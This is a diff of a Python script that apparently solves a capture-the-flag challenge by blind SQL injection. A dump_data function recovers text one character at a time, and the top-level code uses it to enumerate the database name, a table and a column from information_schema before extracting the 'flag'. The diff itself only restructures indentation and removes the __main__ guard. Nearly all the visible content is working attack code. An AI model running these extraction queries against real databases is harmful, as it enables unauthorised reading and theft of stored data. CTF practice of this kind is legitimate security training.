@@ -18,21 +18,20 @@ def dump_data(sql: str) -> str:
                 result += chr(ascii_code)
                 print(chr(ascii_code), end='')
                 break
-        else:
-            break
+            else:
+                break
     return result
 
-if __name__ == "__main__":
-    print("DB: ")
-    db = dump_data("database()")
-    print("\n")
-    print("Table: ")
-    table = dump_data(f"select table_name from information_schema.tables where table_schema='{db}' limit 0,1")
-    print("\n")
-    print("Column:")
-    col = dump_data(f"select column_name from information_schema.columns where table_name='{table}' limit 0,1")
-    print("\n")
-    print("Flag:")
-    flag = dump_data(f"select {col} from {table} limit 0,1")
-    print("\n")
-    print(f"Flag → {flag}")
+print("DB: ")
+db = dump_data("database()")
+print("\n")
+print("Table: ")
+table = dump_data(f"select table_name from information_schema.tables where table_schema='{db}' limit 0,1")
+print("\n")
+print("Column:")
+col = dump_data(f"select column_name from information_schema.columns where table_name='{table}' limit 0,1")
+print("\n")
+print("Flag:")
+flag = dump_data(f"select {col} from {table} limit 0,1")
+print("\n")
+print(f"Flag → {flag}")
